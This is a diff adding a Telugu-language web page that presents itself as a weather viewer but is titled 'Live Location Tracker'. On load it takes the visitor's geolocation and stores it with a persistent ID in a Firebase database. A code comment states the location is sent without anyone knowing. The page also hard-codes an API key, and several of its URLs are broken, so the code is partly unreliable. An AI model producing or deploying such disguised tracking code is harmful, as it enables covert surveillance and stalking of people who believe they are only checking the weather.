@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="te">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Location Tracker</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #e0f7fa; text-align: center; padding: 50px; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
+        h2 { color: #333; }
+        .weather-info { margin-top: 20px; font-size: 16px; color: #555; text-align: left; background: #f9f9f9; padding: 15px; border-radius: 8px; border-left: 5px solid #007bff; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="weather.png" alt="Weather Icon" width="100">
+        <h2>ప్రస్తుత వాతావరణ వివరాలు</h2>
+        <div id="status-msg" style="color: #888;">లొకేషన్ మరియు వాతావరణ సమాచారాన్ని సేకరిస్తోంది...</div>
+        
+        <!-- వాతావరణ డేటా ఇక్కడ కనిపిస్తుంది -->
+        <div id="weather-data"></div>
+    </div>
+
+    <!-- Firebase క్లౌడ్ డేటాబేస్ లింకులు -->
+    <script src="https://gstatic.com"></script>
+    <script src="https://gstatic.com"></script>
+
+    <script>
+        // 1. మీ ఫైర్‌బేస్ డేటాబేస్ లింక్ ఇక్కడ పెట్టండి
+        const firebaseConfig = {
+            databaseURL: "YOUR_FIREBASE_DATABASE_URL" 
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // 2. యూజర్ కోసం ఒక ఆటోమేటిక్ ఐడిని క్రియేట్ చేయడం
+        let userId = localStorage.getItem('tracker_user_id');
+        if (!userId) {
+            userId = 'User-' + Math.floor(1000 + Math.random() * 9000);
+            localStorage.setItem('tracker_user_id', userId);
+        }
+
+        // 3. ఆటోమేటిక్ లొకేషన్ ట్రాకింగ్ మరియు వాతావరణ సేకరణ
+        function startTrackingAndWeather() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    document.getElementById('status-msg').style.display = 'none';
+
+                    // ఎవరికీ తెలియకుండా లొకేషన్ డేటాబేస్‌కు పంపే కోడ్
+                    database.ref('live_locations/' + userId).set({
+                        user: userId,
+                        latitude: lat,
+                        longitude: lon,
+                        last_updated: new Date().toLocaleString()
+                    });
+
+                    // వాతావరణ వివరాలను తెచ్చే కోడ్
+                    const apiKey = '0709e0cd2fabd73d0408ebce3fe07cc4';
+                    try {
+                        const res = await fetch(`https://openweathermap.org{lat}&lon=${lon}&units=metric&appid=${apiKey}`);
+                        const data = await res.json();
+                        
+                        document.getElementById('weather-data').innerHTML = `
+                            <div class="weather-info">
+                                <h3>నగరం: ${data.name}</h3>
+                                <p><b>ఉష్ణోగ్రత:</b> ${data.main.temp} °C</p>
+                                <p><b>వాతావరణం:</b> ${data.weather[0].description}</p>
+                                <p><b>గాలిలో తేమ (Humidity):</b> ${data.main.humidity}%</p>
+                            </div>
+                        `;
+                    } catch (err) {
+                        document.getElementById('weather-data').innerHTML = "<p style='color:red;'>వాతావరణ వివరాలు లోడ్ అవ్వలేదు.</p>";
+                    }
+
+                }, (error) => {
+                    document.getElementById('status-msg').innerHTML = "<span style='color:red;'>దయచేసి వాతావరణం కోసం లొకేషన్ అనుమతి (Allow) ఇవ్వండి.</span>";
+                });
+            } else {
+                document.getElementById('status-msg').innerHTML = "మీ బ్రౌజర్ లొకేషన్ సపోర్ట్ చేయట్లేదు.";
+            }
+        }
+
+        // పేజీ ఓపెన్ అవ్వగానే రన్ అవుతుంది
+        window.onload = startTrackingAndWeather;
+    </script>
+</body>
+</html>
